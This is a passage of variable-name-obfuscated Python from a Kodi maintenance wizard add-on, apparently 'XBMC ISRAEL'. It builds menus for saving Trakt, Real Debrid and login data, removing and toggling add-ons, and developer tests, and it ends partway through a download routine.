	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0O00O0OOO0000O00 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3162
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0O0OO00000O000OO .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0OOO0OOO0000O000 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3165
	addFile ('%s שמירת פליליסט לאודר:  '%O0OO000O0O0O0OOO0 .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת הגדרות באפר: '%OOO00OOO0O00OO00O .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3171
	addFile ('%s שמירת רשימות ריפו:  '%OO0OOOOO00O00OO0O .replace ('true',O000O0000O0O00O0O ).replace ('false',O0O0O0OO00O0OOOOO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3173
	setView ('files','viewType')#line:3175
def traktMenu ():#line:3177
	OO00O0OOOO000O0O0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3178
	OOOO000O00OO0O0OO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3179
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	addFile ('Save Trakt Data: %s'%OO00O0OOOO000O0O0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOOO000O00OO0O0OO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3182
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3183
	for OO00O0OOOO000O0O0 in traktit .ORDER :#line:3185
		O0OO00OOO0OO00O0O =TRAKTID [OO00O0OOOO000O0O0 ]['name']#line:3186
		OOOO00OOO0000OO0O =TRAKTID [OO00O0OOOO000O0O0 ]['path']#line:3187
		O0O0OOO000O0OOO00 =TRAKTID [OO00O0OOOO000O0O0 ]['saved']#line:3188
		OOOOOOO00OOO00000 =TRAKTID [OO00O0OOOO000O0O0 ]['file']#line:3189
		OO0OOOOOOOO0O00O0 =wiz .getS (O0O0OOO000O0OOO00 )#line:3190
		O0O0OOOO0000OO00O =traktit .traktUser (OO00O0OOOO000O0O0 )#line:3191
		O00O000O00O000OO0 =TRAKTID [OO00O0OOOO000O0O0 ]['icon']if os .path .exists (OOOO00OOO0000OO0O )else ICONTRAKT #line:3192
		OOOOO0O0O0OO0000O =TRAKTID [OO00O0OOOO000O0O0 ]['fanart']if os .path .exists (OOOO00OOO0000OO0O )else FANART #line:3193
		O00OO00O0000OOOO0 =createMenu ('saveaddon','Trakt',OO00O0OOOO000O0O0 )#line:3194
		O0O00OO0O000OO000 =createMenu ('save','Trakt',OO00O0OOOO000O0O0 )#line:3195
		O00OO00O0000OOOO0 .append ((THEME2 %'%s Settings'%O0OO00OOO0OO00O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO00O0OOOO000O0O0 )))#line:3196
		addFile ('[+]-> %s'%O0OO00OOO0OO00O0O ,'',icon =O00O000O00O000OO0 ,fanart =OOOOO0O0O0OO0000O ,themeit =THEME3 )#line:3198
		if not os .path .exists (OOOO00OOO0000OO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O000O00O000OO0 ,fanart =OOOOO0O0O0OO0000O ,menu =O00OO00O0000OOOO0 )#line:3199
		elif not O0O0OOOO0000OO00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO00O0OOOO000O0O0 ,icon =O00O000O00O000OO0 ,fanart =OOOOO0O0O0OO0000O ,menu =O00OO00O0000OOOO0 )#line:3200
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0OOOO0000OO00O ,'authtrakt',OO00O0OOOO000O0O0 ,icon =O00O000O00O000OO0 ,fanart =OOOOO0O0O0OO0000O ,menu =O00OO00O0000OOOO0 )#line:3201
		if OO0OOOOOOOO0O00O0 =="":#line:3202
			if os .path .exists (OOOOOOO00OOO00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO00O0OOOO000O0O0 ,icon =O00O000O00O000OO0 ,fanart =OOOOO0O0O0OO0000O ,menu =O0O00OO0O000OO000 )#line:3203
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO00O0OOOO000O0O0 ,icon =O00O000O00O000OO0 ,fanart =OOOOO0O0O0OO0000O ,menu =O0O00OO0O000OO000 )#line:3204
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOOOOOOO0O00O0 ,'',icon =O00O000O00O000OO0 ,fanart =OOOOO0O0O0OO0000O ,menu =O0O00OO0O000OO000 )#line:3205
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3207
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3208
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3211
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3212
	setView ('files','viewType')#line:3213
def realMenu ():#line:3215
	OOOO0O0O000OO0OO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3216
	OOOOOO00OO00O0000 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3217
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3218
	addFile ('Save Real Debrid Data: %s'%OOOO0O0O000OO0OO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3219
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOOOOO00OO00O0000 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3220
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3221
	for O0OOOO0OOO0OO00OO in debridit .ORDER :#line:3223
		OOO0000OO000O00O0 =DEBRIDID [O0OOOO0OOO0OO00OO ]['name']#line:3224
		O00OO0OO0O0O00O00 =DEBRIDID [O0OOOO0OOO0OO00OO ]['path']#line:3225
		OOO0O0O0O0OO00OOO =DEBRIDID [O0OOOO0OOO0OO00OO ]['saved']#line:3226
		O0O00OOOOOOOOOO00 =DEBRIDID [O0OOOO0OOO0OO00OO ]['file']#line:3227
		OOOO000OOO0000OOO =wiz .getS (OOO0O0O0O0OO00OOO )#line:3228
		OOOOO0O000OO0000O =debridit .debridUser (O0OOOO0OOO0OO00OO )#line:3229
		O0O000OOO0OOO0O00 =DEBRIDID [O0OOOO0OOO0OO00OO ]['icon']if os .path .exists (O00OO0OO0O0O00O00 )else ICONREAL #line:3230
		OO000OO00OOO00OO0 =DEBRIDID [O0OOOO0OOO0OO00OO ]['fanart']if os .path .exists (O00OO0OO0O0O00O00 )else FANART #line:3231
		OO0000000O00000OO =createMenu ('saveaddon','Debrid',O0OOOO0OOO0OO00OO )#line:3232
		OO00O000OO0OOOO0O =createMenu ('save','Debrid',O0OOOO0OOO0OO00OO )#line:3233
		OO0000000O00000OO .append ((THEME2 %'%s Settings'%OOO0000OO000O00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OOOO0OOO0OO00OO )))#line:3234
		addFile ('[+]-> %s'%OOO0000OO000O00O0 ,'',icon =O0O000OOO0OOO0O00 ,fanart =OO000OO00OOO00OO0 ,themeit =THEME3 )#line:3236
		if not os .path .exists (O00OO0OO0O0O00O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O000OOO0OOO0O00 ,fanart =OO000OO00OOO00OO0 ,menu =OO0000000O00000OO )#line:3237
		elif not OOOOO0O000OO0000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OOOO0OOO0OO00OO ,icon =O0O000OOO0OOO0O00 ,fanart =OO000OO00OOO00OO0 ,menu =OO0000000O00000OO )#line:3238
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO0O000OO0000O ,'authdebrid',O0OOOO0OOO0OO00OO ,icon =O0O000OOO0OOO0O00 ,fanart =OO000OO00OOO00OO0 ,menu =OO0000000O00000OO )#line:3239
		if OOOO000OOO0000OOO =="":#line:3240
			if os .path .exists (O0O00OOOOOOOOOO00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OOOO0OOO0OO00OO ,icon =O0O000OOO0OOO0O00 ,fanart =OO000OO00OOO00OO0 ,menu =OO00O000OO0OOOO0O )#line:3241
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OOOO0OOO0OO00OO ,icon =O0O000OOO0OOO0O00 ,fanart =OO000OO00OOO00OO0 ,menu =OO00O000OO0OOOO0O )#line:3242
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOO000OOO0000OOO ,'',icon =O0O000OOO0OOO0O00 ,fanart =OO000OO00OOO00OO0 ,menu =OO00O000OO0OOOO0O )#line:3243
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3245
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3246
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3249
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3250
	setView ('files','viewType')#line:3251
def loginMenu ():#line:3253
	O0OO0OOO0OOOOO0O0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3254
	O0O0OO00O0OO0O0OO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3255
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	addFile ('Save Login Data: %s'%O0OO0OOO0OOOOO0O0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0O0OO00O0OO0O0OO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3258
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3259
	for O0OO0OOO0OOOOO0O0 in loginit .ORDER :#line:3261
		O0OOO0O0O0OO0O00O =LOGINID [O0OO0OOO0OOOOO0O0 ]['name']#line:3262
		O0O0000OOO000OOOO =LOGINID [O0OO0OOO0OOOOO0O0 ]['path']#line:3263
		OOO0OOO0O0OO00OO0 =LOGINID [O0OO0OOO0OOOOO0O0 ]['saved']#line:3264
		O0O0O00OOO0OO0O0O =LOGINID [O0OO0OOO0OOOOO0O0 ]['file']#line:3265
		OOOOOO00OO0OOO0OO =wiz .getS (OOO0OOO0O0OO00OO0 )#line:3266
		OO000OO000OOOOO00 =loginit .loginUser (O0OO0OOO0OOOOO0O0 )#line:3267
		OOO0O0O000O0O00O0 =LOGINID [O0OO0OOO0OOOOO0O0 ]['icon']if os .path .exists (O0O0000OOO000OOOO )else ICONLOGIN #line:3268
		OO0O00O0O0O00OO00 =LOGINID [O0OO0OOO0OOOOO0O0 ]['fanart']if os .path .exists (O0O0000OOO000OOOO )else FANART #line:3269
		OOOOOOO0O0OOO0O00 =createMenu ('saveaddon','Login',O0OO0OOO0OOOOO0O0 )#line:3270
		O0O0OOO00O0O00OOO =createMenu ('save','Login',O0OO0OOO0OOOOO0O0 )#line:3271
		OOOOOOO0O0OOO0O00 .append ((THEME2 %'%s Settings'%O0OOO0O0O0OO0O00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0OO0OOO0OOOOO0O0 )))#line:3272
		addFile ('[+]-> %s'%O0OOO0O0O0OO0O00O ,'',icon =OOO0O0O000O0O00O0 ,fanart =OO0O00O0O0O00OO00 ,themeit =THEME3 )#line:3274
		if not os .path .exists (O0O0000OOO000OOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0O0O000O0O00O0 ,fanart =OO0O00O0O0O00OO00 ,menu =OOOOOOO0O0OOO0O00 )#line:3275
		elif not OO000OO000OOOOO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0OO0OOO0OOOOO0O0 ,icon =OOO0O0O000O0O00O0 ,fanart =OO0O00O0O0O00OO00 ,menu =OOOOOOO0O0OOO0O00 )#line:3276
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO000OO000OOOOO00 ,'authlogin',O0OO0OOO0OOOOO0O0 ,icon =OOO0O0O000O0O00O0 ,fanart =OO0O00O0O0O00OO00 ,menu =OOOOOOO0O0OOO0O00 )#line:3277
		if OOOOOO00OO0OOO0OO =="":#line:3278
			if os .path .exists (O0O0O00OOO0OO0O0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0OO0OOO0OOOOO0O0 ,icon =OOO0O0O000O0O00O0 ,fanart =OO0O00O0O0O00OO00 ,menu =O0O0OOO00O0O00OOO )#line:3279
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0OO0OOO0OOOOO0O0 ,icon =OOO0O0O000O0O00O0 ,fanart =OO0O00O0O0O00OO00 ,menu =O0O0OOO00O0O00OOO )#line:3280
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOOO00OO0OOO0OO ,'',icon =OOO0O0O000O0O00O0 ,fanart =OO0O00O0O0O00OO00 ,menu =O0O0OOO00O0O00OOO )#line:3281
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3283
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3284
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3287
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3288
	setView ('files','viewType')#line:3289
def fixUpdate ():#line:3291
	if KODIV <17 :#line:3292
		OO000000000OOO000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3293
		try :#line:3294
			os .remove (OO000000000OOO000 )#line:3295
		except Exception as OOOO0OO00O0000O00 :#line:3296
			wiz .log ("Unable to remove %s, Purging DB"%OO000000000OOO000 )#line:3297
			wiz .purgeDb (OO000000000OOO000 )#line:3298
	else :#line:3299
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3300
def removeAddonMenu ():#line:3302
	O0O000O0O00OO00OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3303
	OO0OO0000OOO000OO =[];OO00O0OO0OOOO0OOO =[]#line:3304
	for O00OOOOOO0OO00OO0 in sorted (O0O000O0O00OO00OO ,key =lambda O000OO000OO0000O0 :O000OO000OO0000O0 ):#line:3305
		OO000O0O0OOO000O0 =os .path .split (O00OOOOOO0OO00OO0 [:-1 ])[1 ]#line:3306
		if OO000O0O0OOO000O0 in EXCLUDES :continue #line:3307
		elif OO000O0O0OOO000O0 in DEFAULTPLUGINS :continue #line:3308
		elif OO000O0O0OOO000O0 =='packages':continue #line:3309
		O0000O00O0OO0OO00 =os .path .join (O00OOOOOO0OO00OO0 ,'addon.xml')#line:3310
		if os .path .exists (O0000O00O0OO0OO00 ):#line:3311
			O0O000OO0O0OOO0OO =open (O0000O00O0OO0OO00 )#line:3312
			OOOO000O000OO0O00 =O0O000OO0O0OOO0OO .read ()#line:3313
			OOO0OOOOOO00O00OO =wiz .parseDOM (OOOO000O000OO0O00 ,'addon',ret ='id')#line:3314
			OOO0O0OO00OO00O00 =OO000O0O0OOO000O0 if len (OOO0OOOOOO00O00OO )==0 else OOO0OOOOOO00O00OO [0 ]#line:3316
			try :#line:3317
				O0O00OOOOOOO0O000 =xbmcaddon .Addon (id =OOO0O0OO00OO00O00 )#line:3318
				OO0OO0000OOO000OO .append (O0O00OOOOOOO0O000 .getAddonInfo ('name'))#line:3319
				OO00O0OO0OOOO0OOO .append (OOO0O0OO00OO00O00 )#line:3320
			except :#line:3321
				pass #line:3322
	if len (OO0OO0000OOO000OO )==0 :#line:3323
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3324
		return #line:3325
	if KODIV >16 :#line:3326
		OO00OOO000000OO00 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0OO0000OOO000OO )#line:3327
	else :#line:3328
		OO00OOO000000OO00 =[];O00OOOO000O00OOOO =0 #line:3329
		OO00OOOO00OOOOOOO =["-- Click here to Continue --"]+OO0OO0000OOO000OO #line:3330
		while not O00OOOO000O00OOOO ==-1 :#line:3331
			O00OOOO000O00OOOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00OOOO00OOOOOOO )#line:3332
			if O00OOOO000O00OOOO ==-1 :break #line:3333
			elif O00OOOO000O00OOOO ==0 :break #line:3334
			else :#line:3335
				OOO000OOOO0OOOO0O =(O00OOOO000O00OOOO -1 )#line:3336
				if OOO000OOOO0OOOO0O in OO00OOO000000OO00 :#line:3337
					OO00OOO000000OO00 .remove (OOO000OOOO0OOOO0O )#line:3338
					OO00OOOO00OOOOOOO [O00OOOO000O00OOOO ]=OO0OO0000OOO000OO [OOO000OOOO0OOOO0O ]#line:3339
				else :#line:3340
					OO00OOO000000OO00 .append (OOO000OOOO0OOOO0O )#line:3341
					OO00OOOO00OOOOOOO [O00OOOO000O00OOOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0OO0000OOO000OO [OOO000OOOO0OOOO0O ])#line:3342
	if OO00OOO000000OO00 ==None :return #line:3343
	if len (OO00OOO000000OO00 )>0 :#line:3344
		wiz .addonUpdates ('set')#line:3345
		for O0O0OOOOOOOO00O00 in OO00OOO000000OO00 :#line:3346
			removeAddon (OO00O0OO0OOOO0OOO [O0O0OOOOOOOO00O00 ],OO0OO0000OOO000OO [O0O0OOOOOOOO00O00 ],True )#line:3347
		xbmc .sleep (1000 )#line:3349
		if INSTALLMETHOD ==1 :O0OO00O0OO0OOO000 =1 #line:3351
		elif INSTALLMETHOD ==2 :O0OO00O0OO0OOO000 =0 #line:3352
		else :O0OO00O0OO0OOO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3353
		if O0OO00O0OO0OOO000 ==1 :wiz .reloadFix ('remove addon')#line:3354
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3355
def removeAddonDataMenu ():#line:3357
	if os .path .exists (ADDOND ):#line:3358
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3360
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3361
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3362
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3363
		OO0O0O0OO00O00OOO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3364
		for O0O0OOO0OOOOOO0O0 in sorted (OO0O0O0OO00O00OOO ,key =lambda OOO0OO000O0OO0O00 :OOO0OO000O0OO0O00 ):#line:3365
			OO0000OOO0000O0OO =O0O0OOO0OOOOOO0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3366
			OOOO0OOOOO000O0O0 =os .path .join (O0O0OOO0OOOOOO0O0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3367
			O000OOO0OOO0OO0OO =os .path .join (O0O0OOO0OOOOOO0O0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3368
			OO0O00OO0O000O000 =OO0000OOO0000O0OO #line:3369
			OO00000O0OOO00000 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3370
			for O0OO0O0OO00O0OO00 in OO00000O0OOO00000 :#line:3371
				OO0O00OO0O000O000 =OO0O00OO0O000O000 .replace (O0OO0O0OO00O0OO00 ,OO00000O0OOO00000 [O0OO0O0OO00O0OO00 ])#line:3372
			if OO0000OOO0000O0OO in EXCLUDES :OO0O00OO0O000O000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO0O00OO0O000O000 #line:3373
			else :OO0O00OO0O000O000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO0O00OO0O000O000 #line:3374
			addFile (' %s'%OO0O00OO0O000O000 ,'removedata',OO0000OOO0000O0OO ,icon =OOOO0OOOOO000O0O0 ,fanart =O000OOO0OOO0OO0OO ,themeit =THEME2 )#line:3375
	else :#line:3376
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3377
	setView ('files','viewType')#line:3378
def enableAddons ():#line:3380
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3381
	O0OOOOO0000O00000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3382
	OO00O0000O000OOO0 =0 #line:3383
	for O00O00O0O000000OO in sorted (O0OOOOO0000O00000 ,key =lambda OOOOOO00000O0O00O :OOOOOO00000O0O00O ):#line:3384
		OO0OOO0OOO000OO00 =os .path .split (O00O00O0O000000OO [:-1 ])[1 ]#line:3385
		if OO0OOO0OOO000OO00 in EXCLUDES :continue #line:3386
		if OO0OOO0OOO000OO00 in DEFAULTPLUGINS :continue #line:3387
		OO0OO0000OO00000O =os .path .join (O00O00O0O000000OO ,'addon.xml')#line:3388
		if os .path .exists (OO0OO0000OO00000O ):#line:3389
			OO00O0000O000OOO0 +=1 #line:3390
			O0OOOOO0000O00000 =O00O00O0O000000OO .replace (ADDONS ,'')[1 :-1 ]#line:3391
			OO0000OOOOOOO0OOO =open (OO0OO0000OO00000O )#line:3392
			OO00000OOO00O0000 =OO0000OOOOOOO0OOO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3393
			O0OO0OOOO0O0OOOOO =wiz .parseDOM (OO00000OOO00O0000 ,'addon',ret ='id')#line:3394
			OO0OOOO0000OO0O00 =wiz .parseDOM (OO00000OOO00O0000 ,'addon',ret ='name')#line:3395
			try :#line:3396
				O00O0OOOOOO0OO00O =O0OO0OOOO0O0OOOOO [0 ]#line:3397
				OOO00OOOOOOOO0O00 =OO0OOOO0000OO0O00 [0 ]#line:3398
			except :#line:3399
				continue #line:3400
			try :#line:3401
				OO00OOO0000000OOO =xbmcaddon .Addon (id =O00O0OOOOOO0OO00O )#line:3402
				OO0O000OOOOOOO00O ="[COLOR green][Enabled][/COLOR]"#line:3403
				OO0OOO0OOO000O0OO ="false"#line:3404
			except :#line:3405
				OO0O000OOOOOOO00O ="[COLOR red][Disabled][/COLOR]"#line:3406
				OO0OOO0OOO000O0OO ="true"#line:3407
				pass #line:3408
			OOOO000OOO0O00000 =os .path .join (O00O00O0O000000OO ,'icon.png')if os .path .exists (os .path .join (O00O00O0O000000OO ,'icon.png'))else ICON #line:3409
			O0O0O0O0OO000000O =os .path .join (O00O00O0O000000OO ,'fanart.jpg')if os .path .exists (os .path .join (O00O00O0O000000OO ,'fanart.jpg'))else FANART #line:3410
			addFile ("%s %s"%(OO0O000OOOOOOO00O ,OOO00OOOOOOOO0O00 ),'toggleaddon',O0OOOOO0000O00000 ,OO0OOO0OOO000O0OO ,icon =OOOO000OOO0O00000 ,fanart =O0O0O0O0OO000000O )#line:3411
			OO0000OOOOOOO0OOO .close ()#line:3412
	if OO00O0000O000OOO0 ==0 :#line:3413
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3414
	setView ('files','viewType')#line:3415
def changeFeq ():#line:3417
	OO0000O0O00O000OO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3418
	O0O00O00O00O0O0O0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO0000O0O00O000OO )#line:3419
	if not O0O00O00O00O0O0O0 ==-1 :#line:3420
		wiz .setS ('autocleanfeq',str (O0O00O00O00O0O0O0 ))#line:3421
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO0000O0O00O000OO [O0O00O00O00O0O0O0 ]))#line:3422
def developer ():#line:3424
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3425
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3426
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3427
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3428
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3429
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3430
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3431
	setView ('files','viewType')#line:3433
def download (O000O0OO00OOOO0O0 ,OOOO0OOOO000OO00O ):#line:3438
  O0O0O00O00O00OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3439
  OOO00O00O0O000OO0 =xbmcgui .DialogProgress ()#line:3440
  OOO00O00O0O000OO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3441
  O0O00OOOOO0OO0O0O =os .path .join (O0O0O00O00O00OOO0 ,'isr.zip')#line:3442
  O0O0OOO0OOOO0O000 =urllib2 .Request (O000O0OO00OOOO0O0 )#line:3443
  OOOOO000O0OO000OO =urllib2 .urlopen (O0O0OOO0OOOO0O000 )#line:3444
  O00O0000O000OO00O =xbmcgui .DialogProgress ()#line:3446
  O00O0000O000OO00O .create ("Downloading","Downloading "+name )#line:3447
  O00O0000O000OO00O .update (0 )#line:3448
  O000OOO0O00OOO0O0 =OOOO0OOOO000OO00O #line:3449
  O00OOOO0O0OO0O0OO =open (O0O00OOOOO0OO0O0O ,'wb')#line:3450
  try :#line:3452
    OO0O0OO0OOO000000 =OOOOO000O0OO000OO .info ().getheader ('Content-Length').strip ()#line:3453
    OOOO00O00O0O00O0O =True #line:3454
  except AttributeError :#line:3455
        OOOO00O00O0O00O0O =False #line:3456
  if OOOO00O00O0O00O0O :#line:3458
        OO0O0OO0OOO000000 =int (OO0O0OO0OOO000000 )#line:3459
  O0OOO000O0OOOO00O =0 #line:3461
  O000O0OOOO000000O =time .time ()#line:3462
  while True :#line:3463
        OOO0O000O00O0O00O =OOOOO000O0OO000OO .read (8192 )#line:3464
        if not OOO0O000O00O0O00O :#line:3465
            sys .stdout .write ('\n')#line:3466
            break #line:3467
        O0OOO000O0OOOO00O +=len (OOO0O000O00O0O00O )#line:3469
        O00OOOO0O0OO0O0OO .write (OOO0O000O00O0O00O )#line:3470
        if not OOOO00O00O0O00O0O :#line:3472
            OO0O0OO0OOO000000 =O0OOO000O0OOOO00O #line:3473
        if O00O0000O000OO00O .iscanceled ():#line:3474
           O00O0000O000OO00O .close ()#line:3475
           try :#line:3476
